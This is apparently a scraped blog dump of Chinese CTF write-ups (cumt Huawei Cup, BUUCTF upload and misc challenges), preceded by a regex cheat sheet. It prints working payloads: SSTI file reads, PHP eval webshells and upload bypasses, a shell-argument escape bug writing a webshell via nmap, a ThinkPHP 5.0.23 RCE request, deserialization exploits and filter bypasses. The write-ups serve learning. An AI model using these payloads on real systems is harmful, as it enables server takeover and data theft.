^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$19. 浮点数：^(-?\\d+)(\\.\\d+)?$ 或 ^-?([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0)$ 123456789101112131415161718192021222324二、校验字符的表达式1. 汉字：^[\\u4e00-\\u9fa5]&#123;0,&#125;$ //u4e00是unicode中第一个汉字编码 u9fa5是最后一个2. 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$ //[A-Za-z0-9]可以匹配大小写字母数字 3. 长度为3-20的所有字符：^.&#123;3,20&#125;$ // .代表任意字符包括换行符4. 由26个英文字母组成的字符串：^[A-Za-z]+$5. 由26个大写英文字母组成的字符串：^[A-Z]+$6. 由26个小写英文字母组成的字符串：^[a-z]+$7. 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ //与第二个表达式相同8. 由数字、26个英文字母或者下划线组成的字符串：^\\w+$ 或 ^\\w&#123;3,20&#125;$ // \\w=[0-9A-Za-z_]9. 中文、英文、数字包括下划线：^[\\u4E00-\\u9FA5A-Za-z0-9_]+$ 10. 中文、英文、数字但不包括下划线等符号：^[\\u4E00-\\u9FA5A-Za-z0-9]+$ 或 ^[\\u4E00-\\u9FA5A-Za-z0-9]&#123;2,20&#125;$ 11. 可以输入含有^%&amp;&#x27;,;=?$\\&quot;等字符：[^%&amp;&#x27;,;=?$\\x22]+ 12 禁止输入含有~的字符：[^~\\x22]+ //这里的 ^是非的意思 下面这些就不一一解释了，实在太多了有的还是重复。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172三、特殊需求表达式1. Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$2. 域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?3. InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$4. 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$5. 电话号码(&quot;XXX-XXXXXXX&quot;、&quot;XXXX-XXXXXXXX&quot;、&quot;XXX-XXXXXXX&quot;、&quot;XXX-XXXXXXXX&quot;、&quot;XXXXXXX&quot;和&quot;XXXXXXXX)：^(\\(\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$6. 国内电话号码(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125;7. 身份证号(15位、18位数字)：^\\d&#123;15&#125;|\\d&#123;18&#125;$8. 短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w&#123;5,17&#125;$11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$12. 日期格式：^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125;13. 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$14. 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$14 钱的输入格式：15 1.有四种钱的表示形式我们可以接受:&quot;10000.00&quot; 和 &quot;10,000.00&quot;, 和没有 &quot;分&quot; 的 &quot;10000&quot; 和 &quot;10,000&quot;：^[1-9][0-9]*$ 16 2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符&quot;0&quot;不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 17 3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 18 4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 19 5.必须说明的是,小数点后面至少应该有1位数,所以&quot;10.&quot;是不通过的,但是 &quot;10&quot; 和 &quot;10.2&quot; 是通过的：^[0-9]+(.[0-9]&#123;2&#125;)?$ 20 6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 21 7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 22 8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 23 备注：这就是最终结果了,别忘了&quot;+&quot;可以用&quot;*&quot;替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里24 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x|X][m|M][l|L]$25 中文字符的正则表达式：[\\u4e00-\\u9fa5]26 双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))27 空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行)28 HTML标记的正则表达式：&lt;(\\S*?)[^&gt;]*&gt;.*?&lt;/\\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)29 首尾空白字符的正则表达式：^\\s*|\\s*$或(^\\s*)|(\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)30 腾讯QQ号：[1-9][0-9]&#123;4,&#125; (腾讯QQ号从10000开始)31 中国邮政编码：[1-9]\\d&#123;5&#125;(?!\\d) (中国邮政编码为6位数字)32 IP地址：\\d+\\.\\d+\\.\\d+\\.\\d+ (提取IP地址时有用)33 IP地址：((?:(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)) 34 将url的协议，主机名，端口号，文件路径放到数组中:var str = &quot;http://www.runoob.com:80/html/html-tutorial.html&quot;;var patt1 = /(\\w+):\\/\\/([^/:]+)(:\\d*)?([^# ]*)/; //四个子表达式组合在一起，(\\w+): 匹配字符串开始到: ([^/:]+) 匹配非/ 非:后的内容 (:\\d*)? 匹配:后的若干数字且表达式重复一次或多次 ([^# ]*) 匹配不包括#或空格字符的任何字符序列 总结正则表达式的功能还是很强大的，想要写出能准确匹配目标的表达式还是需要认真学习的，但是代码审计中的要求没那么严格，只需要能看懂表达式匹配了哪些内容即可。","tags":[]},{"title":"cumt华为杯","date":"2020-10-28T12:26:38.000Z","path":"2020/10/28/华为杯/","text":"cumt_华为杯经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了 webdoge真签到题，抽个奖就给出了flag babyflask刚进入页面，只有一张图片，查看源码也没发现什么 就是了模板注入 1url+&#123;&#123;7*7&#125;&#125;Copy 页面出现404报错，并且显示的是url+49，确定是模板注入 123456789&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;查看模块时，发现存在waf经过测试发现是过滤了[]于是使用&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__()&#125;&#125;存在file模块用read读取文件内容exp:&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag&#x27;).read()Copy 参考链接：https://xz.aliyun.com/t/8029 VulnCMS这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。 这里给出大神的做法 Hodor这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。 看到WP是大S绕过，涨知识了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpClass Source &#123; public function __toString() &#123; return highlight_file(&#x27;license.txt&#x27;, true).highlight_file($this-&gt;source, true); &#125;&#125;function easy_check($str) &#123; //echo $str; if (preg_match(&quot;/flag/i&quot;, $str, $matches)) &#123; return false; &#125; return true;&#125;if(isset($_GET[&#x27;source&#x27;]))&#123; $s = new Source(); $s-&gt;source = __FILE__; echo $s; exit;&#125;$todos = [];if(isset($_COOKIE[&#x27;todos&#x27;]))&#123; if(!easy_check($_COOKIE[&#x27;todos&#x27;])) &#123; echo &quot;Hacker!\\n&quot;; &#125; else &#123; $c = $_COOKIE[&#x27;todos&#x27;]; $h = substr($c, 0, 32); $m = substr($c, 32); if(md5($m) === $h)&#123; $todos = unserialize($m); &#125; &#125;&#125;if(isset($_POST[&#x27;text&#x27;]))&#123; $todo = $_POST[&#x27;text&#x27;]; $todos[] = $todo; $m = serialize($todos); $h = md5($m); setcookie(&#x27;todos&#x27;, $h.$m); header(&#x27;Location: &#x27;.$_SERVER[&#x27;REQUEST_URI&#x27;]); exit;&#125;// flag is in flag.php?Copy exp 1234echo md5(&#x27;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;O:6:&quot;Source&quot;:1:&#123;s:6:&quot;source&quot;;S:8:&quot;\\66lag.php&quot;;&#125;&#125;&#x27;);echo urlencode(&#x27;ae5860e508aaf353a9ad78ac246f46fba:2:&#123;i:0;s:3:&quot;123&quot;;i:1;O:6:&quot;Source&quot;:1:&#123;s:6:&quot;source&quot;;S:8:&quot;\\66lag.php&quot;;&#125;&#125;&#x27;);Copy 参考 https://blog.csdn.net/SmileAndFun/article/details/108497183 webcms是一个博客管理的网站，其实也是个原题，考察点是文件上传 漏洞点在图片中上传图片的位置 随便上传一张图片试试，抓包结果如下，几个注意点 1.filetype规定了文件的类型 2.上传时，将图片保存为了base64形式 所以上传一句话木马的时候要注意修改对应的位置 一句话木马类型为php,则filetype改为php 内容为密码为cmd一句话木马，对应的base64编码PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg== 上传成功，访问保存的路径：http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php 123POST:cmd=system(&quot;cat /flag&quot;);或者蚁剑连接，密码cmdCopy MiscMIsc部分基本都是队友做的，好像也不是太难 伪web真是伪web。。。 直接在文件里搜索就能到flag 搜索关键词cmut，flag所在文件夹为html\\include\\include.php","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"},{"name":"ssti","slug":"ssti","permalink":"https://sunzhengyu99.github.io/tags/ssti/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctf-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"buuctf-upload","date":"2020-10-08T12:34:58.000Z","path":"2020/10/08/buuoj-upload/","text":"buuctf-upload [MRCTF2020]你传你🐎呢先上传一个图片，发现上传成功了，还给出了文件的保存路径 再尝试上传1.php但是出现了，报错提示 首先尝试的是，将Content-Type: image/jpeg改为图片类型，但是还是无法上传 再尝试一下.htaccess文件 文件内容 \"a.jpg\">12SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 上传成功后，再上传包含一句话木马的 a.jpg文件，.htaccess文件的作用就是将指定类型的文件当作php文件运行 所以表面上是jpg类型的文件，但是是当作php文件 上传成功后，蚁剑访问url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg 密码为：cmd [SUCTF 2019]CheckIn试着上传php文件，提示非法后缀名，继续修改后缀名，发现php3,php5,phtml等可执行文件后不可上传 想到上传.htacess文件，但是也提示了非法后缀名，这个方法行不通了 但是之前做upload-labs中还有一个上传.user.ini的文件 .user.ini是什么 这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 .user.ini的作用 可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell 传送门 开始做题 上传.user.ini文件 GIF89a是GIF文件内容开头的几个字符，其作用是为类绕过exif_imagetype() 上传1.gif 文件保存的路径已经给出，开始蚁剑链接的连接是 1url/uploads/04b0951938d905b41348c1548f9c338b/1.gif 但是一直连接不上 后来链接index.php才连接上，这里想到了.user.ini作用，是让所有的php文件包含整个一句话木马，而这里文件路径存在一个index.php，所有说index.php中也存在这个一句话木马 1/uploads/04b0951938d905b41348c1548f9c338b/index.php","tags":[{"name":".htacess","slug":"htacess","permalink":"https://sunzhengyu99.github.io/tags/htacess/"},{"name":".user.ini","slug":"user-ini","permalink":"https://sunzhengyu99.github.io/tags/user-ini/"}]},{"title":"buuctf-z7z8","date":"2020-10-08T12:34:58.000Z","path":"2020/10/08/buuoj-z7z8/","text":"buuctf上的其他题型的集合，懒得分类了 buuctf-z7z8 [BUUCTF 2018]Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); //创建了路径 chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; 前面的两段代码没啥用，主要是后面处理 host的过程 1.知识储备 escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;|*?~&lt;&gt;^()[]{}$,\\x0A和\\xFF。‘和“仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!` 字符都会被空格代替。 namp命令 -T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4-sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试-Pn :禁用ping-host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。-F :快速扫描模式，只扫描在nmap-services文件中列出的端口。 漏洞点在这 echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host); 这有个system来执行命令，而且有传参，肯定是利用这里了 2.构造payload 传入的参数是：172.17.0.2&#39; -v -d a=1 经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl &#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1&#39;，即向172.17.0.2\\发起请求，POST 数据为a=1&#39; 回到mail中，我们的 payload 最终在执行时变成了&#39;-fa&#39;\\\\&#39;&#39;\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)@a.com\\&#39;，分割后就是-fa\\(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com&#39;，最终的参数就是这样被注入的。 参考 需要绕过上面的两个函数，先试试两个函数的作用 12345678910&lt;?php$host = &quot; 1&#x27;shellcode &quot;;$host = escapeshellarg($host);echo $host;echo &quot;\\n&quot;;$host = escapeshellcmd($host);echo $host;?&gt;&#x27; 1&#x27;\\&#x27;&#x27;shellcode &#x27;&#x27; 1&#x27;\\\\&#x27;&#x27;shellcode \\&#x27; 构造的一句话木马为：&#39; &lt;?php @shellcode?&gt; -oG hack.php &#39; 运行结果为：&#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; 这里的单引号都是成对出现的，所以没影响 payload: 1?host=&#x27; &lt;?php @shellcode?&gt; -oG hack.php &#x27; 上传文件的保存路径，利用蚁剑链接一下 参考： https://blog.csdn.net/qq_26406447/article/details/100711933 https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase (写的有点乱) [BJDCTF 2nd]old-hack打开页面出现了提示 BY THINKPHP5 这里应该是php5的漏洞利用，和攻防世界的一道题比较像传送门 先看看报错信息:1 url+?s=1 php版本为5.0.23，上网搜了一下这版本的漏洞 https://xz.aliyun.com/t/3845 直接构造payload，读取目录 12urlPOST:_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls / 看到了flag文件 读取flag 12urlPOST:_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag [MRCTF2020]Ez_bypass12345678910111213141516171819202122232425262728293031I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else &#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else &#123; die(&#x27;only one way to get the flag&#x27;); &#125; &#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125; else &#123; die(&#x27;Please input first&#x27;);&#125;&#125; 先F12找一找提示，原来就是格式化好的源码 1if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) 直接使用数组绕过，也可以使用md5强碰撞的两字符串 12param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 if (!is_numeric($passwd))弱类型比较，使用1234567a绕过 payload: 12345678?id=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;gg=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2POST:passwd=1234567a或者?id[]=1&amp;gg[]=2POST:passwd=1234567a [安洵杯 2019]easy_weburl中包含/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=，仔细看TXpVek5UTTFNbVUzTURabE5qYz0其实是base64编码，解码还是base64，继续解码为一串十六进制的字符，内容为555.png 通过555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0可以类型的构造出index.php查询代码 1234567index.php696e6465782e706870Njk2ZTY0NjU3ODJlNzA2ODcwTmprMlpUWTBOalUzT0RKbE56QTJPRGN3 base64解码后 这题还对一些系统命令进行了过滤，这里需要想办法绕过 ls，不可以使用，但是dir没有过滤，可以使用dir%20/读取目录 cat被过滤了，但是可以使用ca\\t绕过，ca\\t%20/flag (linux命令中可以加) 1if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) md5强碰撞的字符串 12a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 直接查看目录 dir / 获取flag 1ca\\t%20/flag [BJDCTF2020]Mark loves cat变量覆盖 poyload: 12?yds=flagPOST: $flag=flag [BJDCTF2020]The mystery of ip进入页面不知道干啥，随便点点，到flag.php时显示了IP地址 查看原码发现提示&lt;!-- Do you know why i know your ip? --&gt; 猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1 这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去 首先试试system(&quot;ls /&quot;),但是发现没有被执行，于是家上括号&#123;system(&quot;ls /&quot;)&#125;，这次执行成功 最后获取flag, &#123;system(cat /flag)&#125; [网鼎杯 2020 朱雀组]phpweb123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; exp 12345678910111213141516&lt;?phpclass Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125;$a = new Test();$a-&gt;p=&quot;cat /tmp/flagoefiu4r93&quot;;$a-&gt;func=&quot;system&quot;;print(urlencode(serialize($a)));?&gt; [De1CTF 2019]SSRF Me123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;)app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=80) [SUCTF 2019]Pythonginx题目给出了源码 12345678910111213141516171819202122232425@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl(): url = request.args.get(&quot;url&quot;) # 获取get提交的url参数 host = parse.urlparse(url).hostname #获取url中的主机名 if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) #将url分隔开 协议类型 主机名 文件路径 存入列表 parts[1]为主机名 host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) #将主机名以.为分割 进行utf-8解码 parts[1] = &#x27;.&#x27;.join(newhost) #重新组成主机名 #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname # 获取新的主机名 if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; &lt;!-- Dont worry about the suctf.cc. Go on! --&gt; &lt;!-- Do you know the nginx? --&gt; 考察点1： 2019black hat一个议题 1https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。 考察点2: Nginx服务器 https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细 这里只要知道nginx服务器的主要文件路径 配置文件存放目录：/etc/nginx 